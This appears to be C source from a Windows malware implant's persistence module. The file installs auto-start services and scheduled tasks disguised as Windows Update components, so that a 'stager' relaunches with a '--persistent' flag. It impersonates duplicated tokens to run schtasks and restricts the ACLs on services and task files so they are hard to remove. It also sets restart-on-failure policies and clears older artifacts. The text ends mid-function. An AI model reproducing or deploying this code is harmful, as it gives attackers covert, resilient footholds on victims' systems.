#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <sddl.h>
#include <aclapi.h>
#include <stdarg.h>
#include "persistence.h"

#define STAGE_PERSISTENCE_SERVICE_TASK_NAME "WaaSUpdateOrchestratorSvc"
#define STAGE_PERSISTENCE_SERVICE_DISPLAY_PREFIX "Windows Update Refresh Worker"
#define STAGE_PERSISTENCE_TASK_NAME "\\Microsoft\\Windows\\UpdateOrchestrator\\PolicyRefresh"
#define STAGE_PERSISTENCE_SERVICE_TASK_NAME_LEGACY "WaaSUpdateOrchestratorSvcLegacy"
#define STAGE_PERSISTENCE_TASK_NAME_LEGACY "\\Microsoft\\Windows\\WindowsUpdate\\LegacyPolicyRefresh"
#define STAGE_PERSISTENCE_SERVICE_TASK_NAME_LEGACY2 "WaaSUpdateWorkerSvc"
#define STAGE_PERSISTENCE_TASK_NAME_LEGACY2 "\\Microsoft\\Windows\\UpdateOrchestrator\\PolicyRefreshWorker"
#define STAGE_PERSISTENCE_LAUNCH_ARG "--persistent"
#define STAGE_PERSISTENCE_TASK_DIR "SysCache"
#define STAGE_BEACON_STATE_TTL_SECONDS 30
#define STAGE_PERSISTENCE_SDDL_PROTECT "O:SYG:SYD:PAI(A;;FA;;;SY)(A;;FA;;;BA)"
#define STAGE_PERSISTENCE_SDDL_PROTECT_ALT "O:SYG:SYD:PAI(A;;FA;;;SY)(A;;FA;;;BA)"

#define STAGE_PERSISTENCE_SERVICE_SDDL_PROTECT "O:SYD:PAI(A;;FA;;;SY)"
#define STAGE_PERSISTENCE_SERVICE_SDDL_PROTECT_ALT "O:SYD:PAI(A;;FA;;;SY)"

#ifndef LOGV
static void LogPersistPrintf(const char* fmt, ...) {
    va_list args;
    va_start(args, fmt);
    vfprintf(stdout, fmt, args);
    va_end(args);
}
#define LOGV(...) LogPersistPrintf(__VA_ARGS__)
#define LOGE(...) LogPersistPrintf(__VA_ARGS__)
#endif

#define STAGE_ARRAY_COUNT(a) (sizeof(a) / sizeof((a)[0]))

static BOOL BuildProcessMonitorCommand(LPCSTR lpStagerPath, LPCSTR lpStagerName, LPSTR lpCommand, size_t cchCommand);
static BOOL BuildServiceLauncherCommand(LPCSTR lpStagerPath, LPSTR lpCommand, size_t cchCommand);
static BOOL BuildServiceDisplayName(LPCSTR lpServiceName, LPSTR lpDisplayName, size_t cchDisplayName);
static BOOL ApplyProtectedFilesystemAcl(LPCSTR lpPath, LPCSTR lpSddl);
static BOOL ApplyProtectedFilesystemAclWithFallback(LPCSTR lpPath, LPCSTR lpPrimarySddl, LPCSTR lpFallbackSddl);
static BOOL BuildTaskFilesystemPath(LPCSTR lpTaskName, LPSTR lpTaskPath, size_t cchTaskPath);
static BOOL HardenTaskFilesystemObject(LPCSTR lpTaskName);
static BOOL ApplyServiceSecurityDescriptor(SC_HANDLE hService);
static BOOL ApplyServiceFailurePolicy(SC_HANDLE hService);
static BOOL WaitForServiceStartupState(SC_HANDLE hService, DWORD dwTimeoutMs);
static BOOL DeleteLegacyPersistenceArtifacts(void);
static BOOL StopMonitorService(SC_HANDLE hService, DWORD dwServiceState);
static BOOL DeleteMonitorService(LPCSTR lpServiceName);
static BOOL DeleteMonitorServiceWithToken(HANDLE hToken, LPCSTR lpServiceName);
static BOOL DeletePersistenceTask(LPCSTR lpTaskName);
static BOOL DeletePersistenceTaskWithToken(HANDLE hToken, LPCSTR lpTaskName);
static BOOL CreateMonitorService(LPCSTR lpServiceName, LPCSTR lpStagerPath, BOOL bStartImmediately);
static BOOL CreateMonitorServiceWithToken(HANDLE hSystemToken, LPCSTR lpServiceName, LPCSTR lpStagerPath, BOOL bStartImmediately);
static BOOL CreateMonitorTask(LPCSTR lpTaskName, LPCSTR lpStagerPath, BOOL bStartImmediately);
static BOOL CreateMonitorTaskWithToken(HANDLE hToken, LPCSTR lpTaskName, LPCSTR lpStagerPath, BOOL bStartImmediately);
static BOOL RunSchtasksCommand(BOOL bSuppressOutput, int* pExitCode, const char* lpFormat, ...);
static BOOL RunSchtasksCommandWithToken(HANDLE hToken, BOOL bSuppressOutput, int* pExitCode, const char* lpFormat, ...);
static BOOL TaskLikelyExists(LPCSTR lpTaskName);
static BOOL TaskLikelyExistsWithToken(HANDLE hToken, LPCSTR lpTaskName);
static BOOL ExecuteSchtasksCommandWithToken(HANDLE hToken, BOOL bSuppressOutput, const char* lpCommand, int* pExitCode);
static BOOL DuplicateTokenForSchtaskExecution(HANDLE hToken, HANDLE* phPrimaryToken);
static BOOL DuplicateTokenForServiceImpersonation(HANDLE hToken, HANDLE* phImpersonationToken);
static BOOL EnterServiceTokenContext(HANDLE hToken, HANDLE* phImpersonationToken);
static void ExitServiceTokenContext(HANDLE hImpersonationToken);

static BOOL GetBaseFileName(LPCSTR lpPath, LPSTR lpBaseName, size_t cchBaseName) {
    if (!lpPath || !*lpPath || !lpBaseName || cchBaseName == 0) {
        return FALSE;
    }

    const char* slash = strrchr(lpPath, '\\');
    const char* forwardSlash = strrchr(lpPath, '/');
    if (forwardSlash && (!slash || forwardSlash > slash)) {
        slash = forwardSlash;
    }

    if (slash) {
        ++slash;
    } else {
        slash = lpPath;
    }

    _snprintf(lpBaseName, cchBaseName, "%s", slash);
    return lpBaseName[0] != '\0';
}

static BOOL ExecuteSchtasksCommandWithToken(HANDLE hToken, BOOL bSuppressOutput, const char* lpCommand, int* pExitCode) {
    if (!lpCommand || !*lpCommand) {
        return FALSE;
    }

    char systemDir[MAX_PATH] = { 0 };
    char commandLine[2300] = { 0 };
    HANDLE hExecutionToken = NULL;
    HANDLE hNullHandle = NULL;
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    si.cb = sizeof(si);
    si.lpDesktop = "winsta0\\default";
    BOOL bInheritHandles = bSuppressOutput;

    if (!GetSystemDirectoryA(systemDir, MAX_PATH)) {
        _snprintf(systemDir, MAX_PATH, "C:\\Windows\\System32");
    }

    if (_snprintf(commandLine, sizeof(commandLine), "\"%s\\schtasks.exe\" %s", systemDir, lpCommand) < 0) {
        return FALSE;
    }

    if (hToken) {
        if (!DuplicateTokenForSchtaskExecution(hToken, &hExecutionToken)) {
            LOGV("[-] DuplicateTokenForSchtaskExecution failed (%lu)\n", GetLastError());
            hExecutionToken = NULL;
        }
    }

    if (bSuppressOutput) {
        SECURITY_ATTRIBUTES sa = { 0 };
        sa.nLength = sizeof(sa);
        sa.bInheritHandle = TRUE;
        hNullHandle = CreateFileA(
            "NUL",
            GENERIC_WRITE | GENERIC_READ,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            &sa,
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );
        if (hNullHandle == INVALID_HANDLE_VALUE) {
            if (hExecutionToken) {
                CloseHandle(hExecutionToken);
            }
            return FALSE;
        }

        si.dwFlags = STARTF_USESTDHANDLES;
        si.hStdInput = hNullHandle;
        si.hStdOutput = hNullHandle;
        si.hStdError = hNullHandle;
    }

    BOOL bCreated = FALSE;
    DWORD runErr = ERROR_SUCCESS;
    bCreated = CreateProcessA(
        NULL,
        commandLine,
        NULL,
        NULL,
        bInheritHandles,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    );
    if (!bCreated) {
        runErr = GetLastError();
        LOGV("[-] CreateProcessA failed for schtasks command (%lu)\n", runErr);
    }

    if (!bCreated && hToken) {
        if (hExecutionToken == NULL && !DuplicateTokenForSchtaskExecution(hToken, &hExecutionToken)) {
            LOGV("[-] DuplicateTokenForSchtaskExecution failed (%lu), continuing as current token context\n", GetLastError());
            hExecutionToken = NULL;
        }

        if (hExecutionToken) {
            bCreated = CreateProcessAsUserA(
                hExecutionToken,
                NULL,
                commandLine,
                NULL,
                NULL,
                bInheritHandles,
                CREATE_NO_WINDOW,
                NULL,
                NULL,
                &si,
                &pi
            );
            if (!bCreated) {
                runErr = GetLastError();
                LOGV("[-] CreateProcessAsUserA failed for schtasks command (%lu)\n", runErr);
            }
        }

    if (!bCreated) {
        bCreated = CreateProcessA(
            NULL,
            commandLine,
            NULL,
            NULL,
            bInheritHandles,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi
        );
        if (!bCreated) {
            runErr = GetLastError();
            LOGV("[-] non-token schtasks CreateProcessA fallback failed (%lu)\n", runErr);
        }
    }
    }

    if (!bCreated) {
        if (pExitCode) {
            *pExitCode = (int)runErr;
        }
        if (hExecutionToken) {
            CloseHandle(hExecutionToken);
        }
        if (hNullHandle) {
            CloseHandle(hNullHandle);
        }
        return FALSE;
    }

    if (hExecutionToken) {
        CloseHandle(hExecutionToken);
    }

    DWORD exitCode = 0xFFFFFFFF;
    if (WaitForSingleObject(pi.hProcess, 15000) != WAIT_TIMEOUT) {
        GetExitCodeProcess(pi.hProcess, &exitCode);
    }

    if (pi.hProcess) {
        CloseHandle(pi.hProcess);
    }
    if (pi.hThread) {
        CloseHandle(pi.hThread);
    }
    if (hNullHandle) {
        CloseHandle(hNullHandle);
    }

    if (pExitCode) {
        *pExitCode = (int)exitCode;
    }

    if (exitCode == 259) {
        return TRUE;
    }
    return exitCode == 0;
}

static BOOL DuplicateTokenForSchtaskExecution(HANDLE hToken, HANDLE* phPrimaryToken) {
    if (!hToken || !phPrimaryToken) {
        return FALSE;
    }

    *phPrimaryToken = NULL;
    if (DuplicateTokenEx(
            hToken,
            MAXIMUM_ALLOWED,
            NULL,
            SecurityImpersonation,
            TokenPrimary,
            phPrimaryToken
        )) {
        return TRUE;
    }

    LOGV("[-] DuplicateTokenEx(SecurityImpersonation, TokenPrimary) failed for schtasks (%lu), retrying SecurityDelegation\n", GetLastError());
    if (DuplicateTokenEx(
            hToken,
            MAXIMUM_ALLOWED,
            NULL,
            SecurityDelegation,
            TokenPrimary,
            phPrimaryToken
        )) {
        return TRUE;
    }
    return FALSE;
}

static BOOL DuplicateTokenForServiceImpersonation(HANDLE hToken, HANDLE* phImpersonationToken) {
    if (!hToken || !phImpersonationToken) {
        return FALSE;
    }

    *phImpersonationToken = NULL;
    return DuplicateTokenEx(
        hToken,
        MAXIMUM_ALLOWED,
        NULL,
        SecurityImpersonation,
        TokenImpersonation,
        phImpersonationToken
    );
}

static BOOL EnterServiceTokenContext(HANDLE hToken, HANDLE* phImpersonationToken) {
    if (!phImpersonationToken) {
        return FALSE;
    }

    *phImpersonationToken = NULL;
    if (!hToken) {
        return TRUE;
    }

    if (!DuplicateTokenForServiceImpersonation(hToken, phImpersonationToken)) {
        return FALSE;
    }

    if (!SetThreadToken(NULL, *phImpersonationToken)) {
        CloseHandle(*phImpersonationToken);
        *phImpersonationToken = NULL;
        return FALSE;
    }

    return TRUE;
}

static void ExitServiceTokenContext(HANDLE hImpersonationToken) {
    if (hImpersonationToken) {
        RevertToSelf();
        CloseHandle(hImpersonationToken);
    }
}

static BOOL RunSchtasksCommandWithToken(HANDLE hToken, BOOL bSuppressOutput, int* pExitCode, const char* lpFormat, ...) {
    if (!lpFormat || !*lpFormat) {
        return FALSE;
    }

    char command[2048] = { 0 };
    va_list args;
    va_start(args, lpFormat);
    int commandLen = _vsnprintf(command, sizeof(command), lpFormat, args);
    va_end(args);
    if (commandLen < 0 || commandLen >= (int)sizeof(command)) {
        return FALSE;
    }

    return ExecuteSchtasksCommandWithToken(hToken, bSuppressOutput, command, pExitCode);
}

static BOOL RunSchtasksCommand(BOOL bSuppressOutput, int* pExitCode, const char* lpFormat, ...) {
    if (!lpFormat || !*lpFormat) {
        return FALSE;
    }

    char command[2048] = { 0 };
    va_list args;
    va_start(args, lpFormat);
    int commandLen = _vsnprintf(command, sizeof(command), lpFormat, args);
    va_end(args);
    if (commandLen < 0 || commandLen >= (int)sizeof(command)) {
        return FALSE;
    }

    return ExecuteSchtasksCommandWithToken(NULL, bSuppressOutput, command, pExitCode);
}

static BOOL TaskLikelyExistsWithToken(HANDLE hToken, LPCSTR lpTaskName) {
    if (!lpTaskName || !*lpTaskName) {
        return FALSE;
    }

    int queryStatus = 0;
    if (!RunSchtasksCommandWithToken(hToken, TRUE, &queryStatus, "/query /tn \"%s\"", lpTaskName)) {
        return FALSE;
    }
    return queryStatus == 0;
}

static BOOL TaskLikelyExists(LPCSTR lpTaskName) {
    return TaskLikelyExistsWithToken(NULL, lpTaskName);
}

static BOOL ApplyProtectedFilesystemAcl(LPCSTR lpPath, LPCSTR lpSddl) {
    if (!lpPath || !*lpPath || !lpSddl || !*lpSddl) {
        return FALSE;
    }

    return ApplyProtectedFilesystemAclWithFallback(lpPath, lpSddl, STAGE_PERSISTENCE_SDDL_PROTECT_ALT);
}

static BOOL ApplyProtectedFilesystemAclWithFallback(LPCSTR lpPath, LPCSTR lpPrimarySddl, LPCSTR lpFallbackSddl) {
    if (!lpPath || !*lpPath || !lpPrimarySddl || !*lpPrimarySddl) {
        return FALSE;
    }

    const char* lpCandidates[3] = { lpPrimarySddl, lpFallbackSddl, NULL };

    for (int i = 0; i < 3; ++i) {
        const char* lpCandidate = lpCandidates[i];
        if (!lpCandidate) {
            return FALSE;
        }

        PSECURITY_DESCRIPTOR pSecurityDescriptor = NULL;
        if (!ConvertStringSecurityDescriptorToSecurityDescriptorA(
                lpCandidate,
                SDDL_REVISION_1,
                &pSecurityDescriptor,
                NULL
            )) {
            LOGV("[-] ConvertStringSecurityDescriptorToSecurityDescriptorA failed for filesystem candidate %d (%lu)\n", i, GetLastError());
            continue;
        }

        BOOL bApplied = SetFileSecurityA(lpPath, DACL_SECURITY_INFORMATION, pSecurityDescriptor);
        DWORD dwErr = GetLastError();
        LocalFree(pSecurityDescriptor);
        if (bApplied) {
            return TRUE;
        }

        SetLastError(dwErr);
        LOGV("[-] SetFileSecurityA failed for filesystem candidate %d (%lu)\n", i, dwErr);
    }

    return FALSE;
}

static BOOL BuildTaskFilesystemPath(LPCSTR lpTaskName, LPSTR lpTaskPath, size_t cchTaskPath) {
    if (!lpTaskName || !*lpTaskName || !lpTaskPath || cchTaskPath == 0) {
        return FALSE;
    }

    char windowsRoot[MAX_PATH] = { 0 };
    if (!GetWindowsDirectoryA(windowsRoot, MAX_PATH)) {
        _snprintf(windowsRoot, MAX_PATH, "C:\\Windows");
    }

    if (lpTaskName[0] == '\\' || lpTaskName[0] == '/') {
        lpTaskName += 1;
    }

    if (_snprintf(lpTaskPath, cchTaskPath, "%s\\System32\\Tasks\\%s", windowsRoot, lpTaskName) < 0) {
        return FALSE;
    }

    for (size_t i = 0; lpTaskPath[i] != '\\0'; ++i) {
        if (lpTaskPath[i] == '/') {
            lpTaskPath[i] = '\\';
        }
    }

    return TRUE;
}

static BOOL HardenTaskFilesystemObject(LPCSTR lpTaskName) {
    if (!lpTaskName || !*lpTaskName) {
        return FALSE;
    }

    char lpTaskPath[MAX_PATH * 2] = { 0 };
    if (!BuildTaskFilesystemPath(lpTaskName, lpTaskPath, sizeof(lpTaskPath))) {
        return FALSE;
    }

    if (!ApplyProtectedFilesystemAcl(lpTaskPath, STAGE_PERSISTENCE_SDDL_PROTECT)) {
        LOGV("[-] Failed to harden scheduled task file ACL %s (%lu)\n", lpTaskPath, GetLastError());
        return FALSE;
    }

    return TRUE;
}

static BOOL BuildProcessMonitorCommand(LPCSTR lpStagerPath, LPCSTR lpStagerName, LPSTR lpCommand, size_t cchCommand) {
    char safePath[MAX_PATH] = { 0 };

    if (!lpStagerPath || !*lpStagerPath || !lpCommand || cchCommand == 0) {
        return FALSE;
    }

    if (_snprintf(safePath, sizeof(safePath), "\"%s\"", lpStagerPath) < 0) {
        return FALSE;
    }
    if (_snprintf(lpCommand, cchCommand, "%s %s", safePath, STAGE_PERSISTENCE_LAUNCH_ARG) < 0) {
        return FALSE;
    }

    return TRUE;
}

static BOOL DeletePersistenceTask(LPCSTR lpTaskName) {
    return DeletePersistenceTaskWithToken(NULL, lpTaskName);
}

static BOOL DeletePersistenceTaskWithToken(HANDLE hToken, LPCSTR lpTaskName) {
    if (!lpTaskName || !*lpTaskName) {
        return FALSE;
    }

    if (!TaskLikelyExistsWithToken(hToken, lpTaskName)) {
        return TRUE;
    }

    int status = 0;
    if (!RunSchtasksCommandWithToken(
            hToken,
            TRUE,
            &status,
            "/delete /tn \"%s\" /f",
            lpTaskName
        )) {
        LOGV("[-] schtasks delete failed for %s (code=%d)\n", lpTaskName, status);
        return FALSE;
    }
    return TRUE;
}

static BOOL BuildServiceDisplayName(LPCSTR lpServiceName, LPSTR lpDisplayName, size_t cchDisplayName) {
    if (!lpServiceName || !*lpServiceName || !lpDisplayName || cchDisplayName == 0) {
        return FALSE;
    }

    return _snprintf(
               lpDisplayName,
               cchDisplayName,
               "%s (%s)",
               STAGE_PERSISTENCE_SERVICE_DISPLAY_PREFIX,
               lpServiceName
           ) > 0;
}

static BOOL BuildServiceLauncherCommand(LPCSTR lpStagerPath, LPSTR lpCommand, size_t cchCommand) {
    if (!lpStagerPath || !*lpStagerPath || !lpCommand || cchCommand == 0) {
        return FALSE;
    }

    return _snprintf(lpCommand, cchCommand, "\"%s\" " STAGE_PERSISTENCE_LAUNCH_ARG, lpStagerPath) >= 0;
}

static BOOL ApplyServiceFailurePolicy(SC_HANDLE hService) {
    if (!hService) {
        return FALSE;
    }

    SC_ACTION actions[] = {
        { SC_ACTION_RESTART, 60000 },
        { SC_ACTION_RESTART, 120000 },
        { SC_ACTION_RESTART, 180000 },
    };

    SERVICE_FAILURE_ACTIONS failureActions = { 0 };
    failureActions.dwResetPeriod = 86400;
    failureActions.cActions = STAGE_ARRAY_COUNT(actions);
    failureActions.lpsaActions = actions;
    if (!ChangeServiceConfig2A(hService, SERVICE_CONFIG_FAILURE_ACTIONS, &failureActions)) {
        return FALSE;
    }

    return TRUE;
}

static BOOL WaitForServiceStartupState(SC_HANDLE hService, DWORD dwTimeoutMs) {
    if (!hService) {
        return FALSE;
    }

    DWORD elapsedMs = 0;
    const DWORD sleepMs = 250;
    SERVICE_STATUS serviceStatus = { 0 };

    while (elapsedMs < dwTimeoutMs) {
        if (!QueryServiceStatus(hService, &serviceStatus)) {
            return FALSE;
        }

        if (serviceStatus.dwCurrentState == SERVICE_RUNNING) {
            return TRUE;
        }

        if (serviceStatus.dwCurrentState == SERVICE_START_PENDING) {
            Sleep(sleepMs);
            elapsedMs += sleepMs;
            continue;
        }

        if (serviceStatus.dwCurrentState == SERVICE_STOPPED || serviceStatus.dwCurrentState == SERVICE_STOP_PENDING) {
            return FALSE;
        }
        break;
    }

    return serviceStatus.dwCurrentState == SERVICE_RUNNING || serviceStatus.dwCurrentState == SERVICE_START_PENDING;
}

static BOOL ApplyServiceSecurityDescriptor(SC_HANDLE hService) {
    if (!hService) {
        return FALSE;
    }

    PSECURITY_DESCRIPTOR pSecurityDescriptor = NULL;
    const char* serviceSdCandidates[] = {
        STAGE_PERSISTENCE_SERVICE_SDDL_PROTECT,
        STAGE_PERSISTENCE_SERVICE_SDDL_PROTECT_ALT,
        NULL
    };

    for (int i = 0; i < 3; ++i) {
        if (!serviceSdCandidates[i]) {
            return FALSE;
        }

        if (!ConvertStringSecurityDescriptorToSecurityDescriptorA(
                serviceSdCandidates[i],
                SDDL_REVISION_1,
                &pSecurityDescriptor,
                NULL
            )) {
            LOGV(
                "[-] ConvertStringSecurityDescriptorToSecurityDescriptorA failed for service candidate %d (%lu)\n",
                i,
                GetLastError()
            );
            continue;
        }

        BOOL bApplied = SetServiceObjectSecurity(
            hService,
            DACL_SECURITY_INFORMATION,
            pSecurityDescriptor
        );
        DWORD dwErr = GetLastError();
        LocalFree(pSecurityDescriptor);
        pSecurityDescriptor = NULL;
        if (bApplied) {
            return TRUE;
        }

        SetLastError(dwErr);
        LOGV("[-] SetServiceObjectSecurity failed for service candidate %d (%lu)\n", i, dwErr);
    }

    return FALSE;
}

static BOOL DeleteLegacyPersistenceArtifacts(void) {
    DeleteMonitorService(STAGE_PERSISTENCE_SERVICE_TASK_NAME_LEGACY);
    DeleteMonitorService(STAGE_PERSISTENCE_SERVICE_TASK_NAME_LEGACY2);
    DeletePersistenceTask(STAGE_PERSISTENCE_TASK_NAME_LEGACY);
    DeletePersistenceTask(STAGE_PERSISTENCE_TASK_NAME_LEGACY2);
    return TRUE;
}

static BOOL StopMonitorService(SC_HANDLE hService, DWORD dwServiceState) {
    if (!hService || dwServiceState != SERVICE_RUNNING) {
        return TRUE;
    }

    SERVICE_STATUS serviceStatus = { 0 };
    if (!ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus)) {
        return FALSE;
    }

    for (DWORD i = 0; i < 10; ++i) {
        if (!QueryServiceStatus(hService, &serviceStatus)) {
            return FALSE;
        }
        if (serviceStatus.dwCurrentState != SERVICE_STOP_PENDING) {
            return serviceStatus.dwCurrentState == SERVICE_STOPPED;
        }
        Sleep(500);
    }

    return FALSE;
}

static BOOL DeleteMonitorService(LPCSTR lpServiceName) {
    if (!lpServiceName || !*lpServiceName) {
        return FALSE;
    }

    SC_HANDLE hServiceManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hServiceManager) {
        return FALSE;
    }

    SC_HANDLE hService = OpenServiceA(
        hServiceManager,
        lpServiceName,
        SERVICE_QUERY_STATUS | SERVICE_STOP | DELETE
    );
    if (!hService) {
        CloseServiceHandle(hServiceManager);
        return FALSE;
    }

    BOOL bRemoved = FALSE;
    if (!DeleteService(hService)) {
        DWORD dwErr = GetLastError();
        if (dwErr == ERROR_SERVICE_MARKED_FOR_DELETE) {
            bRemoved = TRUE;
        } else {
            SERVICE_STATUS serviceStatus = { 0 };
            if (QueryServiceStatus(hService, &serviceStatus)) {
                StopMonitorService(hService, serviceStatus.dwCurrentState);
                bRemoved = DeleteService(hService);
            }
        }
    } else {
        bRemoved = TRUE;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hServiceManager);
    return bRemoved;
}

static BOOL DeleteMonitorServiceWithToken(HANDLE hToken, LPCSTR lpServiceName) {
    if (!lpServiceName || !*lpServiceName) {
        return FALSE;
    }

    HANDLE hImpersonationToken = NULL;
    if (!EnterServiceTokenContext(hToken, &hImpersonationToken)) {
        return FALSE;
    }

    SC_HANDLE hServiceManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hServiceManager) {
        ExitServiceTokenContext(hImpersonationToken);
        return FALSE;
    }

    SC_HANDLE hService = OpenServiceA(
        hServiceManager,
        lpServiceName,
        SERVICE_QUERY_STATUS | SERVICE_STOP | DELETE
    );
    if (!hService) {
        DWORD dwErr = GetLastError();
        CloseServiceHandle(hServiceManager);
        ExitServiceTokenContext(hImpersonationToken);
        return dwErr == ERROR_SERVICE_DOES_NOT_EXIST || dwErr == ERROR_SERVICE_MARKED_FOR_DELETE;
    }

    BOOL bRemoved = FALSE;
    SERVICE_STATUS serviceStatus = { 0 };
    if (QueryServiceStatus(hService, &serviceStatus) && serviceStatus.dwCurrentState == SERVICE_RUNNING) {
        StopMonitorService(hService, serviceStatus.dwCurrentState);
    }

    if (!DeleteService(hService)) {
        if (GetLastError() == ERROR_SERVICE_MARKED_FOR_DELETE) {
            bRemoved = TRUE;
        }
    } else {
        bRemoved = TRUE;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hServiceManager);
    ExitServiceTokenContext(hImpersonationToken);
    return bRemoved;
}

static BOOL CreateMonitorService(LPCSTR lpServiceName, LPCSTR lpStagerPath, BOOL bStartImmediately) {
    return CreateMonitorServiceWithToken(NULL, lpServiceName, lpStagerPath, bStartImmediately);
}

static BOOL CreateMonitorServiceWithToken(HANDLE hSystemToken, LPCSTR lpServiceName, LPCSTR lpStagerPath, BOOL bStartImmediately) {
    if (!lpServiceName || !*lpServiceName || !lpStagerPath || !*lpStagerPath) {
        return FALSE;
    }

    HANDLE hImpersonationToken = NULL;
    if (!EnterServiceTokenContext(hSystemToken, &hImpersonationToken)) {
        return FALSE;
    }

    SC_HANDLE hServiceManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
    if (!hServiceManager) {
        ExitServiceTokenContext(hImpersonationToken);
        return FALSE;
    }

    char serviceCommand[MAX_PATH * 2] = { 0 };
    if (!BuildServiceLauncherCommand(lpStagerPath, serviceCommand, sizeof(serviceCommand))) {
        CloseServiceHandle(hServiceManager);
        ExitServiceTokenContext(hImpersonationToken);
        return FALSE;
    }

    char serviceDisplayName[MAX_PATH] = { 0 };
    if (!BuildServiceDisplayName(lpServiceName, serviceDisplayName, sizeof(serviceDisplayName))) {
        CloseServiceHandle(hServiceManager);
        ExitServiceTokenContext(hImpersonationToken);
        return FALSE;
    }

    SC_HANDLE hService = OpenServiceA(
        hServiceManager,
        lpServiceName,
        SERVICE_QUERY_STATUS | SERVICE_START
    );
    DWORD dwOpenErr = ERROR_SERVICE_DOES_NOT_EXIST;
    BOOL bAlreadyExisted = FALSE;
    BOOL bCanMutate = TRUE;
    if (hService) {
        bAlreadyExisted = TRUE;
    }
    if (!hService) {
        dwOpenErr = GetLastError();
        if (dwOpenErr == ERROR_ACCESS_DENIED) {
            hService = OpenServiceA(
                hServiceManager,
                lpServiceName,
                SERVICE_QUERY_STATUS |
                SERVICE_QUERY_CONFIG |
                SERVICE_CHANGE_CONFIG |
                SERVICE_START |
                SERVICE_STOP |
                READ_CONTROL |
                WRITE_DAC
            );
            if (hService) {
                bCanMutate = TRUE;
                bAlreadyExisted = TRUE;
            }
            if (!hService) {
                hService = OpenServiceA(
                    hServiceManager,
                    lpServiceName,
                    SERVICE_QUERY_STATUS | SERVICE_START
                );
                if (hService) {
                    bCanMutate = FALSE;
                    bAlreadyExisted = TRUE;
                }
            }
        }
    }

    if (!hService) {
        if (
            dwOpenErr != ERROR_SERVICE_DOES_NOT_EXIST &&
            dwOpenErr != ERROR_ACCESS_DENIED &&
            dwOpenErr != ERROR_SERVICE_MARKED_FOR_DELETE
        ) {
            LOGV("[-] OpenServiceA failed for persistence service %s (%lu)\n", lpServiceName, dwOpenErr);
            CloseServiceHandle(hServiceManager);
            ExitServiceTokenContext(hImpersonationToken);
            return FALSE;
        }

        hService = CreateServiceA(
            hServiceManager,
            lpServiceName,
            serviceDisplayName,
            SERVICE_ALL_ACCESS,
            SERVICE_WIN32_OWN_PROCESS,
            SERVICE_AUTO_START,
            SERVICE_ERROR_IGNORE,
            serviceCommand,
            NULL,
            NULL,
            NULL,
            NULL,
            NULL
        );
        if (!hService) {
            DWORD dwCreateErr = GetLastError();
            LOGV("[-] CreateServiceA failed for persistence service %s (%lu)\n", lpServiceName, dwCreateErr);
            if (
                dwCreateErr == ERROR_SERVICE_EXISTS ||
                dwCreateErr == ERROR_DUP_NAME ||
                dwCreateErr == ERROR_SERVICE_MARKED_FOR_DELETE
            ) {
                LOGV("[*] Persistence service %s already exists; preserving existing artifact.\n", lpServiceName);
                hService = OpenServiceA(
                    hServiceManager,
                    lpServiceName,
                    SERVICE_QUERY_STATUS | SERVICE_START
                );
                if (!hService) {
                    CloseServiceHandle(hServiceManager);
                    ExitServiceTokenContext(hImpersonationToken);
                    return FALSE;
                }
                bCanMutate = FALSE;
                bAlreadyExisted = TRUE;
            } else {
                CloseServiceHandle(hServiceManager);
                ExitServiceTokenContext(hImpersonationToken);
                return FALSE;
            }
        } else {
            bCanMutate = TRUE;
        }
    }

    if (bAlreadyExisted) {
        LOGV("[*] Existing persistence service %s detected; leaving command/path unchanged.\n", lpServiceName);
    }

    if (bCanMutate && !bAlreadyExisted) {
        if (!ApplyServiceSecurityDescriptor(hService)) {
            LOGV("[-] Service security descriptor hardening could not be applied for %s (%lu)\n", lpServiceName, GetLastError());
        }
        if (!ApplyServiceFailurePolicy(hService)) {
            LOGV("[-] Service failure policy hardening could not be configured for %s (%lu)\n", lpServiceName, GetLastError());
        }
    }

    BOOL bResult = TRUE;
    if (bStartImmediately) {
        SERVICE_STATUS serviceStatus = { 0 };
        if (QueryServiceStatus(hService, &serviceStatus)) {
            if (serviceStatus.dwCurrentState != SERVICE_RUNNING) {
                if (serviceStatus.dwCurrentState == SERVICE_START_PENDING) {
                    if (!WaitForServiceStartupState(hService, 5000)) {
                        LOGV("[-] Persistence service %s did not enter running state in time (%lu)\n", lpServiceName, GetLastError());
                    }
                } else {
                    if (!StartServiceA(hService, 0, NULL)) {
                        DWORD dwErr = GetLastError();
                        if (dwErr == ERROR_SERVICE_ALREADY_RUNNING) {
                            bResult = TRUE;
                        } else if (dwErr == ERROR_SERVICE_REQUEST_TIMEOUT || dwErr == 1053 || dwErr == ERROR_IO_PENDING) {
                            LOGV("[*] StartServiceA returned non-fatal (%lu) for service %s. Monitoring startup.\n", dwErr, lpServiceName);
                            WaitForServiceStartupState(hService, 7000);
                            bResult = TRUE;
                        } else {
                            LOGV("[-] StartServiceA failed for persistence service %s (%lu)\n", lpServiceName, dwErr);
                            bResult = FALSE;
                        }
                    } else if (!WaitForServiceStartupState(hService, 7000)) {
                        bResult = FALSE;
                    }
                }
            }
        } else {
                if (!StartServiceA(hService, 0, NULL)) {
                    DWORD dwErr = GetLastError();
                    if (dwErr == ERROR_SERVICE_ALREADY_RUNNING) {
                        bResult = TRUE;
                    } else if (dwErr == ERROR_SERVICE_REQUEST_TIMEOUT || dwErr == 1053 || dwErr == ERROR_IO_PENDING) {
                        LOGV("[*] StartServiceA returned non-fatal (%lu) for service %s. Monitoring startup.\n", dwErr, lpServiceName);
                        WaitForServiceStartupState(hService, 7000);
                        bResult = TRUE;
                    } else {
                        LOGV("[-] StartServiceA failed for persistence service %s (%lu)\n", lpServiceName, dwErr);
                        bResult = FALSE;
                    }
                } else if (!WaitForServiceStartupState(hService, 7000)) {
                    bResult = FALSE;
                }
        }
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hServiceManager);
